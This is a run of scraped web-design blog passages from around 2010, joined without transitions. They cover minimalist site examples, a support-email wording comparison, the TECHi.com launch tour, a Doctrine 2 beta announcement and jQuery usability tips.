alt=\"Khahoang in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"268\"></a></p><p><a href=\"http://www.therulesofagentleman.com/\">The Rules of a Gentleman</a><br> Everything from the thick black border at the top to the mix of typography make this website elegant and sophisticated.</p><p><a href=\"http://www.therulesofagentleman.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/rulesofagentleman.jpg\" alt=\"Rulesofagentleman in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"293\"></a></p><p><a href=\"http://www.ryanwillms.com/\">Ryan Willms</a><br> The spacing and arrangement of content here, along with the elegant typography and simple lines, make for a fresh design.</p><p><a href=\"http://www.ryanwillms.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/ryanwillms.jpg\" alt=\"Ryanwillms in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://www.visualcraftsman.com/\">Visual Craftsman</a><br> This has more detail than many minimalist websites, particularly with the border and other subtle graphics.</p><p><a href=\"http://www.visualcraftsman.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/visualcraftsman.jpg\" alt=\"Visualcraftsman in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://electricgecko.de/\">Electricgecko</a><br> The subtle colored box behind the content sets this design apart.</p><p><a href=\"http://electricgecko.de/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/electricgecko.jpg\" alt=\"Electricgecko in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><h3>Color Minimally</h3><p>Color takes on added significance in a minimalist design. Choosing the right palette or accent colors is vital. Many designers opt for a simple black, white and/or gray palette, but minimalism has room for any color in the rainbow.</p><p>Like details, color becomes critical with fewer elements. Pay attention to the meanings of the colors you choose and how they interact with one another.</p><h4>Examples</h4><p><a href=\"http://kylesollenberger.com/\">Kyle Sollenberger Design</a><br> Subtle pastel colors set apart certain content here.</p><p><a href=\"http://kylesollenberger.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/kylesollenberger.jpg\" alt=\"Kylesollenberger in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"343\"></a></p><p><a href=\"http://pixelbot.ro/\">Pixelbot Webdesign</a><br> Bright colors stand out against this otherwise black-and-white design.</p><p><a href=\"http://pixelbot.ro/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/pixelbot.jpg\" alt=\"Pixelbot in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"388\"></a></p><p><a href=\"http://www.mattbango.com/\">MattBango.com</a><br> The shades of blue are subtle but highlight special areas of this otherwise black, white and gray design.</p><p><a href=\"http://www.mattbango.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/mattbango.jpg\" alt=\"Mattbango in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"356\"></a></p><p><a href=\"http://secondandpark.com/\">Second and Park</a><br> Muted colors work well in a minimalist design, particularly when combined with gray.</p><p><a href=\"http://secondandpark.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/secondandpark.jpg\" alt=\"Secondandpark in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://www.glingadesign.com/\">Glinga</a><br> A simple website with a gray background and colored accents.</p><p><a href=\"http://www.glingadesign.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/glinga.jpg\" alt=\"Glinga in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://deartroy.com/blog/\">Deartoy</a><br> Another simple design with colored accents.</p><p><a href=\"http://deartroy.com/blog/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/deartoy.jpg\" alt=\"Deartoy in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://sprawsm.com/\">Superawesome</a><br> Magenta is a popular accent color for minimalist sites.</p><p><a href=\"http://sprawsm.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/superawesome.jpg\" alt=\"Superawesome in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://www.thinkingforaliving.org/\">Thinking for a Living</a><br> A website with a lot more color than many other minimalist websites, but the palette is well thought out.</p><p><a href=\"http://www.thinkingforaliving.org/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/thinkingforaliving.jpg\" alt=\"Thinkingforaliving in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://www.wearenation.co.uk/\">Nation</a><br> Another colorful website with a great palette.</p><p><a href=\"http://www.wearenation.co.uk/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/nation.jpg\" alt=\"Nation in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><h3>White Space Is Vital</h3><p>White (or negative) space is the backbone of any minimalist design. What you leave out of a design is just as important as what you put in. White space is critical to emphasizing certain elements over others.</p><p>White space “makes” a design minimalist to a large extent. Without it, you’d end up with a grid design or grunge or some other style that’s not truly minimalist.</p><h4>Examples</h4><p><a href=\"http://www.rikcatindustries.com/\">Rikcat Industries</a><br> Ample space between elements keeps this website from feeling cluttered.</p><p><a href=\"http://www.rikcatindustries.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/rikcatindustries.jpg\" alt=\"Rikcatindustries in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://www.straightline.jp/\">Straightline</a><br> Another example of a ton of white space around elements.</p><p><a href=\"http://www.straightline.jp/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/straightline.jpg\" alt=\"Straightline in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://52weeksofux.com/\">52 Weeks of UX</a><br> Filling every column on the page is not necessary, as evidenced here on the 52 Weeks of UX website.</p><p><a href=\"http://52weeksofux.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/52weeksofux.jpg\" alt=\"52weeksofux in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://blog.metrogallery.com.au/\">Metro Gallery</a><br> The Metro Gallery pays a lot of attention to white space, right down the spacing of letters in its category headers.</p><p><a href=\"http://blog.metrogallery.com.au/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/metrogallery.jpg\" alt=\"Metrogallery in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"266\"></a></p><p><a href=\"http://www.blankspaces.net/\">Blank Studio</a><br> Ample white space is used here.</p><p><a href=\"http://www.blankspaces.net/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/blankstudio.jpg\" alt=\"Blankstudio in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"254\"></a></p><h3>Trends</h3><p>There are plenty of trends in minimalist design. Some have been around for so long that “trend” is probably not even the right word to use. In any case, the following elements are being put to good use in a variety of minimalist designs.</p><h4>Gray</h4><p>Gray is fundamental to minimalist design. Shades of it are used for backgrounds, text, images and pretty much all other elements, often combined with black and white or other colors.</p><p><a href=\"http://www.brianhoff.net/\">Brian Hoff</a><br> Gray can be used as an accent, not just for typography or backgrounds.</p><p><a href=\"http://www.brianhoff.net/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/brianhoff.jpg\" alt=\"Brianhoff in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://mikstudios.com/\">Michael Cronin</a><br> Of course, gray also makes for a great background color, and it takes on a cool tone when combined with icy blue.</p><p><a href=\"http://mikstudios.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/michaelcronin.jpg\" alt=\"Michaelcronin in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"327\"></a></p><p><a href=\"http://www.rossgunter.com/\">Ross Gunter</a><br> Another very simple design with a gray background.</p><p><a href=\"http://www.rossgunter.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/rossgunter.jpg\" alt=\"Rossgunter in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"322\"></a></p><p><a href=\"http://www.sortdesign.co.uk/\">Sort Design</a><br> Medium gray allows for good contrast with typography, while also making a stronger impact in the background than light gray.</p><p><a href=\"http://www.sortdesign.co.uk/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/sortdesign.jpg\" alt=\"Sortdesign in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://jackosborne.co.uk/\">Jack Osborne</a><br> Gray lends itself particularly well to gradients.</p><p><a href=\"http://jackosborne.co.uk/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/jackosborne.jpg\" alt=\"Jackosborne in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"280\"></a></p><p><a href=\"http://www.5-squared.com/\">5-Squared</a><br> Combining multiple shades of gray lends visual interest without cluttering.</p><p><a href=\"http://www.5-squared.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/5squared.jpg\" alt=\"5squared in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><h4>Big Typography</h4><p>Big typography is often used in place of images to add more graphic interest to a website.</p><p><a href=\"http://www.blakeallendesign.com/\">Blake Allen Design</a><br> Oversized typography is used throughout this website.</p><p><a href=\"http://www.blakeallendesign.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/blakeallendesign.jpg\" alt=\"Blakeallendesign in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://kylesteed.com/\">Kyle Steed</a><br> Big typography is a popular choice for minimalist headers.

Based on MooTools it is complete standards compliant and comes with as many options as you think of: from transition speed to captions, image titles and linking images. Additionally, it's only 24kb in size and the first image will display already while the others load in the background, thanks to the implementation of a preloader.

If you’d like to signup for a new paid account today, you’ll have the 30 day free trial, but we can’t offer any additional discounts on subsequent months. Sorry about this.</p>\n\n\n</blockquote>\n\n\t<p>Seemed negative so went back to the drawing board:</p>\n\n\n<blockquote>\n\n\t<p>We’d love to have you as a customer. I think you and the business will be very happy with Highrise. When you signup for a trial account, you automatically get 30 days free time before you’ll be charged. On top of that, if you use 37HRWEL as the coupon code, you’ll get 20% off the first month. That’s the best offer we have available right now.</p>\n\n\n\t<p>I hope you guys will come on board. Have a great day.</p>\n\n\n</blockquote>\n\n\t<p>Says about the same thing without the sorrys and nos. 1st way: sorry, don’t, can’t, sorry. 2nd way: love, very happy, free time, on top, best offer, hope, great day.

Please meet our new site: <a rel=\"follow\" href=\"http://www.techi.com\">TECHi.com</a></p>\n<p>It’s a brand new and amazing technology blog that focuses on tech stuff that’s always fresh and never boring.</p>\n<p>You may have already come across it, or seen a few of the ads floating around the web. But now, it’s official, TECHi.com is out of beta and ready for prime time.</p>\n<p>I’m super proud and excited today to shine the spotlight on the site that we’ve been working on so much for the past few months. And now, I’ll be taking you on a little tour of the new website, discussing the content and design and how it all came together.</p>\n<p>As always, your feedback will be greatly appreciated and it will help us make the site even better…<span></span></p>\n<h1>What is TECHi?</h1>\n<p>Putting it simply, it’s a technology blog. But we don’t like the ‘boring’ tech stuff that we often find on the web (stuff like acquisitions, mergers, stocks going up/down, start-ups that nobody cares about, etc), so we avoid those topics for the most part, unless they’re truly relevant, and we try to make them as much fun to read as possible.</p>\n<p>You’ll find in depth articles, like on WDD, as well as the latest tech news and the coolest/weirdest gadgets, along with some fun posts. Our tagline is<em> ‘fresh and never boring’ </em>and I think it really describes Techi to a tee.</p>\n<p>While on WDD we usually post only one article per day, on Techi you can sometimes find more than 20 posts on a day. The daily content usually includes a couple of editorials with the rest being short posts for news and cool stuff. Don’t worry, we won’t overwhelm you, and you can have as much or as little as you want. Even our <a rel=\"follow\" href=\"http://www.techi.com/rssfeeds\">RSS feeds</a> are customized so that you can choose to either get the whole ‘enchilada’ or just eat the bytes that you’re most interested in.</p>\n<p>Here’s a full preview of our homepage. Click anywhere on the image to go to the live site:</p>\n<p><a href=\"http://www.techi.com\"><img src=\"http://netdna.webdesignerdepot.com/uploads/876/tc.jpg\" alt=\"\" width=\"615\" height=\"3198\"></a></p>\n<p><br></p>\n<h1>The TECHi name</h1>\n<p>I love the name of this site! And at only 5 letters, it’s even shorter than Google! We played with many different names and we originally decided on one that I liked but wasn’t quite perfect. As usual we went through the frustrating process of going through dozens of domain name options only to find that most of them were already taken.</p>\n<p>We registered a few domains that contained the word ‘tech’, which is something that I really wanted. Eventually, we ended up buying Techi.com from a domain name reseller and I couldn’t be happier. It was a bit pricey, but it was worth every penny. I love the domain name and it couldn’t be simpler or easier to remember or type.</p>\n<p>Oh, and by the way, it’s pronounced <em>Tech-ee</em>, not<em> Tech-eye.</em></p>\n<p><br></p>\n<h1>Where did the idea come from?</h1>\n<p>I know this sounds funny, but it seems that most of my good ideas come to me while taking a hot bath and that’s precisely where the idea for Techi came up.</p>\n<p>I basically looked at my personal browsing patterns and noticed that while I love to browse and read design blogs, I also like to keep up to date with the latest technology stuff. I think that many WDD readers will relate to this and be in the same boat with me on this one.</p>\n<p>So that’s where Techi.com fills the gap between design and all the other cool stuff happening on the web right now.</p>\n<p><br></p>\n<h1>The Content</h1>\n<p>At the top of the latest posts on our homepage, we have a menu which acts as a filter for the content. You can choose to view ALL content or select just EDITORIALS, COOL, NEWS or BREAKING. We made sure to have a good mix of things for everyone, whether you’re looking for a quick read or something more in-depth.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/876/2.jpg\" alt=\"\"></p>\n<p><br></p>\n<h2><strong>EDITORIALS</strong></h2>\n<p>These are in-depth articles, similar in style to what we have on WDD and 100% original. We do analysis pieces about technology, make sense of the latest tech news as well as fun posts, or interesting round ups about tech related stuff. Here are some examples of our latest editorials:</p>\n<ul>\n<li><a rel=\"follow\" href=\"http://www.techi.com/2010/04/the-riaa-and-mpaa-have-failed-to-understand-a-cultural-shift/\">The RIAA and MPAA Have Failed To Understand A Cultural Shift</a></li>\n<li><a rel=\"follow\" href=\"http://www.techi.com/2010/04/captcha-advertising-coming-soon-to-a-website-near-you/\">CAPTCHA Advertising Coming Soon To A Website Near You</a></li>\n<li><a rel=\"follow\" href=\"http://www.techi.com/2010/04/the-chages-at-facebook-the-good-and-the-bad-and-the-very-ugly/\">The Changes at Facebook: The Good, The Bad and The Very Ugly</a></li>\n<li><a rel=\"follow\" href=\"http://www.techi.com/2010/04/how-the-blackberry-can-get-its-mojo-back/\">Six Back to the Future Innovations We’re Still Waiting For</a></li>\n<li><a rel=\"follow\" href=\"http://www.techi.com/2010/04/how-the-blackberry-can-get-its-mojo-back/\">How the Blackberry Can Get Its Mojo Back</a></li>\n<li><a rel=\"follow\" href=\"http://www.techi.com/2010/04/the-potentially-grim-future-of-firefox/\">The (Potentially Grim) Future Of Firefox</a></li>\n<li><a rel=\"follow\" href=\"http://www.techi.com/2010/04/how-i-learned-to-love-3d-i-think/\">How I Learned to Love 3D… I Think</a></li>\n<li><a rel=\"follow\" href=\"http://www.techi.com/2010/04/3d-half-baked-tech-not-ready-for-prime-time/\">3D: Half-Baked Tech Not Ready For Prime Time</a></li>\n<li><a rel=\"follow\" href=\"http://www.techi.com/2010/04/identity-the-twitter-killer-we-never-expected/\">Identity: The Twitter Killer We Never Expected</a></li>\n<li><a rel=\"follow\" href=\"http://www.techi.com/2010/04/rules-of-engagement-six-things-not-to-do-on-twitter/\">Rules of Engagement: Six Things Not To Do on Twitter</a></li>\n</ul>\n<p><br></p>\n<h2><strong>COOL</strong></h2>\n<p><strong> </strong>The cool section features new, cool (and sometimes really weird) gadgets, fun things and anything else that we feel is ‘cool’.

Here are some of the news topics that we recently covered:</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/876/3b.gif\" alt=\"\"></p>\n<p><br></p>\n<h1>The Design</h1>\n<p>I hired my good friend, the very talented <a rel=\"nofollow\" href=\"http://www.mattdempsey.com/\">Matt Dempsey</a> (whom I’ve worked with in the past), to put together my vision for Techi.</p>\n<p>For my own projects, I like to work together with other designers as a joint collaboration gets me the best results. The fact that we’re both designers allows us to bounce ideas back and forth until we get the best possible solution. An external designer will also see things more objectively and call things as they see them. And Matt got it perfectly right.</p>\n<p>Good design is transparent, they say, and this is what we tried to achieve here. There’s so much great content on Techi that the design had to be kept to a minimum so as not to interfere. We wanted to let our readers focus on the content of the site and not on the design. That being said, you will notice beautiful details and a truly excellent layout that makes the site design the perfect platform for Techi’s content.</p>\n<p>Here are some of Matt’s insights about the design:</p>\n<blockquote><p><em>My aim for Techi was to really highlight the content and let the design blend into the background. For a tech site with constantly updating news, big pictures and big videos, you really don’t want the design to get in the way, especially if your visitors come back every day. Consequently most of the design is grayscale, with occasional bright colours being given to highlight categories and social media.</em></p>\n<p><em>Also, for a new technology site which will undoubtedly get a large portion of its initial traffic from occasional articles performing well on social media, it was important to make the logo as prominent as possible to increase the likelihood of a first time visitor remembering the brand. Walter also wanted the featured articles to be prominent and detached from the latest articles.</em></p>\n<p><em>Bearing both of these in mind, instead of predictably having the logo on the top left, I’ve decided to place it between the featured and latest content, acting as a separator whilst increasing the chances of still being in view if the user does choose to scroll straight to the latest post.</em></p>\n</blockquote>\n<p><br></p>\n<p><strong>TYPOGRAPHY<br>\n <span style=\"font-weight:normal\">The logo is set in <a rel=\"nofollow\" href=\"http://new.myfonts.com/fonts/linotype/trade-gothic/bold-condensed-no-20-63882/\">Trade Gothic Bold Condensed No. 20</a> with the tagline being in <a rel=\"nofollow\" href=\"http://www.fontsquirrel.com/fonts/Aller\">Aller Light</a>. The font used for the headers, as well as for the text under the thumbnails in the cool and latest news sections, is <a rel=\"nofollow\" href=\"http://www.fontsquirrel.com/fonts/Droid-Sans\">Droid Sans</a> which is being displaying using @font-face. The body text uses <a rel=\"nofollow\" href=\"http://new.myfonts.com/fonts/adobe/helvetica/\">Helvetica</a>.</span></strong></p>\n<p><strong>FEATURED POSTS</strong><br>\n There are a total of 9 posts being featured in a slideshow format at the top of the site. Check out the cool custom pagination buttons in the top right corner. They each have their own timer which resets when you mouse over the content so that the page doesn’t slide out of view when you’re focusing on it.</p>\n<p>The featured content includes some of our latest editorials, breaking news and other pieces that we feel are worth highlighting. The section is updated several times a day, so that there’s always something fresh to read when you come back to the site.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/876/8.jpg\" alt=\"\"></p>\n<p><strong>SIDEBAR: Widgets, Popular Posts, Latest Videos<br>\n <span style=\"font-weight:normal\">Besides the section navigation menu, a site this big has a lot of content and instead of having a massive horizontal menu at the top, or drop down menus, I decided to ignore this traditional way of organizing content by creating a right sidebar that allows you to drill deeper into the site’s content. Remember that my goal with Techi is to keep it ‘fresh and never boring’ and I felt that this should relate to the content’s organization as well as how you interact with it.</span></strong></p>\n<ul>\n<li><strong>Widgets:</strong> <strong>Categories <br>\n <span style=\"font-weight:normal\">This is a really neat way to find content of interest by clicking on the main categories of the site. We designed some neat icons for each category. Try it out on the live site: simply click on any icon and a new page will slide in to view the latest posts on any given category. At the top right corner you’ll find a link to <em>see all</em> posts in the selected category. Click on the <em>back </em>link to return to the category list. I drew inspiration from the navigation style of the iPhone and we implemented these sliding panels using Ajax.</span></strong></li>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/876/5.gif\" alt=\"\" width=\"319\" height=\"443\"></p>\n<li><strong>Widgets: Popular Tags</strong><br>\n This custom widget was based on the iPhone once again and is one of the most original ways to browse through tags that I’ve ever seen. Try it out, it’s really fun to play with. Simply click on a tag to see all posts related to that tag. Originally we put all the tags that we had there, but there were too many and that was slowing the widget down and became too difficult to navigate, so now we’re only showing the most popular tags.</li>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/876/6.gif\" alt=\"\" width=\"319\" height=\"506\"></p>\n<li><strong>Popular Posts<br>\n <span style=\"font-weight:normal\">Plain and simple, this area displays the current most popular posts using a special algorithm. </span></strong></li>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/876/10.gif\" alt=\"\" width=\"317\" height=\"525\"></p>\n<li><strong>Latest Videos<br>\n <span style=\"font-weight:normal\">This area highlights the latest posts that contain videos.</span></strong></li>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/876/9.jpg\" alt=\"\" width=\"319\" height=\"525\"></p>\n</ul>\n<p><strong>FOOTER<br>\n <span style=\"font-weight:normal\">I  wanted something original and unobtrusive for the footer. With so many posts displayed vertically, I didn’t want a tall footer that’s loaded with information as it would extend the page unnecessarily. That’s why we used the sidebar as a way to display content and navigation. Matt designed a really cool and original footer with just the basics that you’d expect to find there. It works very well and I really like it.</span></strong></p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/876/7.gif\" alt=\"\"></p>\n<p><strong>PAGE DOES NOT EXIST / NO SEARCH RESULTS<br>\n </strong>You gotta have them! And I had some some fun creating these two pages: <a rel=\"follow\" href=\"http://www.techi.com/i-do-not-exist\">404</a> and <a rel=\"follow\" href=\"http://www.techi.com/?s=fagegrafdgurgehu\">no search results</a></p>\n<p><br></p>\n<h1 style=\"font-size:2em\">Hosting</h1>\n<p><strong><span style=\"font-weight:normal\">Techi.com is hosted by the good folks at <a rel=\"nofollow\" href=\"http://www.vps.net/?w3source=5\">VPS.net</a> which are also the hosts for Webdesigner Depot. The site is running and responding really well even on days of massive traffic. VPS  uses the <a rel=\"nofollow\" href=\"http://www.vps.net/akamai\">Akamai</a> Content Delivery Network which allows for higher speeds thanks to object caching and delivery of images based on the servers closest to each visitor’s location.</span></strong></p>\n<p><br></p>\n<h1>You and Techi</h1>\n<p>I had great success with WDD thanks to an awesome team of very dedicated writers, and the same is true for Techi. There’s an amazing group of people working together behind the scenes to create a truly awesome site with great content. But that of course is only one part of the equation.</p>\n<p>Ultimately, your support and input will make this site really better and better every day, just like you did for WDD. So today, I’d like to ask you for your support. If you enjoy what we’re doing on Techi, please help us out by spreading the word to your friends, colleagues, etc. It can be a quick email, a retweet, or sharing one of our stories on Facebook, or even word of mouth. A comment on the site means a lot to me and to the authors writing the content as it shows us that you care about the effort that we put into this and it help us become better at what we do.</p>\n<p>Of course, if you have ideas or suggestions for improvement, I’m all ears, please do let me know about it. I love constructive criticism and although we’re still tweaking a few things, and I’m always happy to listen to your feedback! Thanks in advance for your support!</p>\n<p><br></p>\n<h1>Banner ads</h1>\n<p>If you wish to promote Techi through your own site or blog, that’d be truly awesome and deeply appreciated. I made some really cool banners that you can download to display on your own sites. Here are some examples, but there are a lot more in this file: <a rel=\"nofollow\" href=\"http://netdna.webdesignerdepot.com/uploads/876/banners.zip\">banners.zip</a></p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/876/a.jpg\" alt=\"\"><img src=\"http://netdna.webdesignerdepot.com/uploads/876/c.jpg\" alt=\"\"></p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/876/d.jpg\" alt=\"\"><img src=\"http://netdna.webdesignerdepot.com/uploads/876/b.jpg\" alt=\"\"></p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/876/e.jpg\" alt=\"\"><img src=\"http://netdna.webdesignerdepot.com/uploads/876/f.jpg\" alt=\"\"></p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/876/g.jpg\" alt=\"\"><img src=\"http://netdna.webdesignerdepot.com/uploads/876/h.jpg\" alt=\"\"></p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/876/j.jpg\" alt=\"\"><img src=\"http://netdna.webdesignerdepot.com/uploads/876/k.jpg\" alt=\"\"></p>\n<p><br></p>\n<h1>That’s all folks!</h1>\n<p>So there you have it, the entire Techi story in a nutshell! I hope you enjoyed reading this and most importantly that you enjoy reading and visiting Techi.com</p>\n<p>It’s a really great site with potential for a lot more, go ahead and try it out, there’s tons of great stuff there that most of you will enjoy and hey, there’s even have a design section, so I’m sure you’ll feel at home right away.

It comes with some delay which was caused partly by our move to git and github and the switch to the Symfony Console component for the CLI. We had to confront the alpha users with quite some backwards compatibility problems and we apologize for that. Starting with the beta period you can expect the amount of backwards incompatible changes to be much lower.</p>\n\n<p>Since the ALPHA4 release over 160 issues have been resolved. You can find the full changelog <a href=\"http://www.doctrine-project.org/jira/secure/ReleaseNote.jspa?projectId=10032&amp;styleName=Html&amp;version=10030\">here</a>.</p>\n\n<p>Some of the most important changes were the shift towards the Symfony (2) Console component for the CLI as well as the introduction of the inversedBy attribute for bidirectional associations, among others. For some help with upgrading from ALPHA4 to BETA1, please consult <a href=\"http://www.doctrine-project.org/upgrade/2_0\">the upgrade page</a>.</p>\n\n<p>You can get the new release as usual from our <a href=\"http://www.doctrine-project.org/download\">download page</a> or <a href=\"http://github.com/doctrine/doctrine2\">directly from github</a>.</p>\n\n<p>We would like to thank all the adopters of the early alpha releases. All your issue reports, feature and enhancement requests and general feedback and criticism have helped a lot to move the project forward.</p>\n\n<p>Looking forward, we will likely have at least 2 or 3 beta releases, about every 1-2 months, before we go RC. Once that happens, the API is ultimately frozen until the stable release.</p>\n</div>"

But we never bring this thought process into our jQuery-based (and other JavaScript-based) elements. How can we enhance the user experience and usability of our jQuery events?</p><p>Below, we’ll briefly discuss ways to look at the code and the result of our interactive designs and, thus, improve their usability.</p><p>[By the way, did you know we have a brand new free <a href=\"http://www.smashingmagazine.com/the-smashing-newsletter/\">Smashing Email Newsletter</a>? Subscribe now and get fresh short tips and tricks on Tuesdays!]</p><h3>Don’t Leave Users In The Dark</h3><p>Most if not all jQuery is fired through events from the user, whether it’s loading new content, posting forms or simply modifying the presentation of an item. Such events are fired through a click from the user.</p><p>While as designers and developers we would know that something is happening, without a visual representation, the user is left guessing what is going on. If the user clicks an element and nothing occurs immediately, they could wonder whether the page is broken or they have done something wrong.</p><p>But by simply displaying a message or loading graphic for the user, they are <strong>assured that something is happening</strong> and that their action will be completed shortly.</p><p><a href=\"http://pinchzoom.com/\">Pinchzoom</a> offers a consistent experience when loading new content by displaying a spinning graphic alongside the word “Loading.” The constant motion of the graphic tells the user that the website is working on their request.</p><p><a href=\"http://pinchzoom.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/pinchzoom-loading.jpg\" alt=\"Pinchzoom-loading in Usability Dos And Donts For Interactive Design\" width=\"500\" height=\"200\"></a><br> <em>Pinchzoom shows a rotating graphic and text in a modal box to catch the user’s attention and tell them that content is loading.</em></p><h3>Always Put Your Code To The Test</h3><p>As part of any testing process, designers make sure that their interactive design will work across multiple browsers. Unfortunately, we do not test our design elements by using them as a normal user would. You’d be surprised how differently we use our own websites.</p><p>Users vary widely in their behavior and viewing set-ups, so don’t be reluctant to use your design in different ways and with different set-ups.</p><p>By trying to break your JavaScript, you could come across bugs that you didn’t notice before, which will lead you to <strong>create a stabler and more solid user experience.</strong> Coming across an element that appears to be broken or not functioning correctly will often make users lose trust in the website as a whole.</p><h3>Don’t Add jQuery At The User’s Expense</h3><p>One of the last things you want is a confused user. Adding too many interactive elements can make the user unable to decide what to do or how to find what they need.</p><p>When building your website, <strong>restrict the number of controls</strong> to those that will help the user achieve their goal. By restricting choice, you create a much more effective user experience.</p><p>An example of this problem can be seen on the <a href=\"http://cpbgroup.com/\">Crispin Porter + Bogusky</a> website. This website has a lot of scrolling navigation and many “Read more” links that load more content on the page. This overloads the user with information. New users might be unsure what to do, where to go or if they’ve missed important information.</p><p><a href=\"http://cpbgroup.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/crispinporter-overloading-information.jpg\" alt=\"Crispinporter-overloading-information in Usability Dos And Donts For Interactive Design\" width=\"500\" height=\"375\"></a><br> <em>Crispin Porter + Bogusky shows too many options at once.</em></p><h3>Speed Isn’t Always Key</h3><p>We always optimize our code to load pages faster and help users complete their tasks more quickly. On the other hand, there are instances when slowing down animations could improve the usability of a website.</p><p>Animations such as those showing rotation through messages or pictures are often set too fast. We must remember that users don’t want to be rushed. Give them time to take everything in. A user shouldn’t be halfway through reading an item and then have to wait for it to rotate before being able to finish.</p><p>Whether you use a plug-in to generate the effect or core jQuery code, settings should be available to change the speed of the animation. In most cases, keywords such as “slow” or “fast” can be used. If you wish to be more exact with your timings, numeric values such as “800” or “1200” are available, which would specify time in milliseconds.</p><p>The home page of <a href=\"http://www.postbox-inc.com/\">Postbox</a> features a rotating list of news and key items. Though not a prominent feature of the design, the delay between each item is long enough to <strong>allow the user to fully absorb the information</strong>.</p><p><a href=\"http://www.postbox-inc.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/postbox-rotating-messages.jpg\" alt=\"Postbox-rotating-messages in Usability Dos And Donts For Interactive Design\" width=\"500\" height=\"350\"></a><br> <em>Rotating messages on the Postbox home page.</em></p><h3>Make Tabs More Prominent</h3><p>Though more of usability tip for design, this deserves mention nonetheless. If you are using tabs to show and hide content, make sure they are prominent and that each tab describes its content well.</p><p>Tabs are a great space-saver and some say they allow for more creativity in a design. But don’t risk the user <strong>overlooking potentially important content</strong>.</p><p>By making tabs prominent, you enable users to find more information easily should they need it. Also, being more descriptive in your labeling makes clear to the user what they should expect to see.</p><p><a 